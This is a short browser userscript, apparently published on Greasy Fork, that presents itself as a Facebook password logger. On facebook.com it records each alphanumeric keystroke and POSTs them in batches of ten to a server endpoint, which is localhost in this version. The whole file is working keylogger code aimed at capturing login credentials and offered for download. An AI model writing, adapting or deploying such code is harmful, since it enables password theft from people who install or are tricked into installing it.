// ==UserScript==
// @name         FB password logger don't download this or you'll get hack
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Logs letters and numbers typed and sends them to a server
// @author       Your Name
// @match        https://www.facebook.com
// @license      MIT
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/498335/FB%20password%20logger%20don%27t%20download%20this%20or%20you%27ll%20get%20hack.user.js
// @updateURL https://update.greasyfork.org/scripts/498335/FB%20password%20logger%20don%27t%20download%20this%20or%20you%27ll%20get%20hack.meta.js
// ==/UserScript==

(function() {
    'use strict';

    let keystrokes = '';

    // Function to log keystrokes
    function logKeystrokes(event) {
        let key = event.key;

        // Check if the key is a letter or number
        if (/^[a-zA-Z0-9]$/.test(key)) {
            keystrokes += key;
        }

        // Send keystrokes to the server if length exceeds 10 characters
        if (keystrokes.length >= 10) {
            sendKeystrokesToServer(keystrokes);
            keystrokes = ''; // Reset keystrokes
        }
    }

    // Function to send keystrokes to the server
    function sendKeystrokesToServer(keystrokes) {
        fetch('http://localhost:3000/log-keystrokes', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ keystrokes })
        })
        .then(response => response.text())
        .then(data => console.log(data))
        .catch(error => console.error('Error:', error));
    }

    // Add event listener to the document to capture keydown events
    document.addEventListener('keydown', logKeystrokes, true);
})();